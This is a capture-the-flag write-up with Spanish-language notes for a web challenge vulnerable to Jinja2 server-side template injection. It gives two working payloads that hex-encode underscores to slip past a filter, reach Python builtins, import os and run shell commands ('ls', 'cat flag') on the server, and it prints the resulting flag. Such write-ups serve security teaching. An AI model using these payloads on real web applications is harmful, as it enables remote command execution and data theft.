Descripcion:

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://chatelaine.cylabacademy.net:34895/)!

Solucion:

```

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

```

academy{sst1_f1lt3r_byp4ss_7d09ff8d}

Notas:

Primero accede al objeto request y mediante attr() navega por atributos internos de Python. Los caracteres _ se escriben como \x5f para evadir el filtro que bloquea __. De esta forma se llega a __globals__, luego a __builtins__ y finalmente a __import__ para importar el módulo os.

Con os.popen('ls') se ejecuta el comando ls, que lista los archivos del servidor y permite ver que existe un archivo llamado flag. Después se cambia el comando a os.popen('cat flag') para mostrar el contenido de ese archivo y obtener la flag del reto.